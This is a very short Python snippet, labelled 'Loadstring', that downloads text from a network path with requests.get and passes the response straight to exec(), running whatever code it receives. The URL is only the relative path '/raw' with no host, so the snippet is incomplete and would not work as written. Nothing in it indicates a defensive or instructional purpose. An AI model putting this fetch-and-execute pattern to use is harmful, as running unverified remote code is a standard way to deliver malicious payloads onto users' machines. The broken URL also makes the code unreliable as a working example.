import requests
# Loadstring 
r = requests.get('/raw')
exec(r.text)
